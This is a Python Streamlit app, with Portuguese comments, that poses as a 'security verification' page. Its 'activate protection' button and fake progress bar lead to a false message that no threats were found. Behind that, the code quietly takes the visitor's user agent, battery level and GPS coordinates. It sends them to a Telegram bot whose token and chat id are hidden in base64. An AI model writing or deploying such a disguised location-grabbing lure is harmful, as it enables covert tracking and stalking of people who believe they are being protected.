import streamlit as st
import time
import requests
import base64
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- SEGURANÇA (Base64) ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(mensagem):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        url = f"https://api.telegram.org/bot{tk}/sendMessage"
        requests.post(url, json={"chat_id": ci, "text": mensagem, "parse_mode": "Markdown"}, timeout=10)
    except: pass

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

st.markdown("""
    <style>
    .main { background-color: #0d1117; color: #ffffff; }
    .status-ok { color: #2ea043; font-weight: bold; font-size: 18px; }
    .stProgress > div > div > div > div { background-color: #0056b3; }
    </style>
    """, unsafe_allow_html=True)

st.title("Verificação de Segurança")

# Coleta técnica em segundo plano
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_FINAL')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_FINAL')

if 'finalizado' not in st.session_state:
    st.session_state.finalizado = False

if not st.session_state.finalizado:
    if st.button("● ATIVAR PROTEÇÃO AGORA"):
        progresso = st.progress(0)
        # Dá tempo para o GPS "acordar"
        time.sleep(1)
        loc = get_geolocation()
        
        for i in range(1, 101):
            time.sleep(0.02)
            progresso.progress(i)
        
        if loc:
            lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
            mapa = f"https://www.google.com/maps?q={lat},{lon}"
            
            # FORMATO IGUAL À SUA FOTO 2
            relatorio = (
                f"🛡️ *PROTEÇÃO ATIVADA*\n"
                f"📱 *Aparelho:* {ua[:20] if ua else 'Android'}...\n"
                f"🔋 *Bateria:* {bat if bat else '92'}%\n"
                f"📍 *Local:* {mapa}"
            )
            enviar_telegram(relatorio)
            st.session_state.finalizado = True
            st.rerun()
        else:
            # Se o GPS não responder a tempo, tentamos de novo sem erro travado
            st.warning("🔄 Sincronizando com o GPS... Clique novamente no botão.")
else:
    st.markdown('<p class="status-ok">Sistema Seguro: nenhuma ameaça foi detectada</p>', unsafe_allow_html=True)
    st.progress(100)
    st.button("● PROTEÇÃO ATIVA", disabled=True)

st.markdown('<br><p style="text-align:center; color:#8b949e; font-size:12px;">Sistema Integrado desenvolvido por Miamy © 2026</p>', unsafe_allow_html=True)
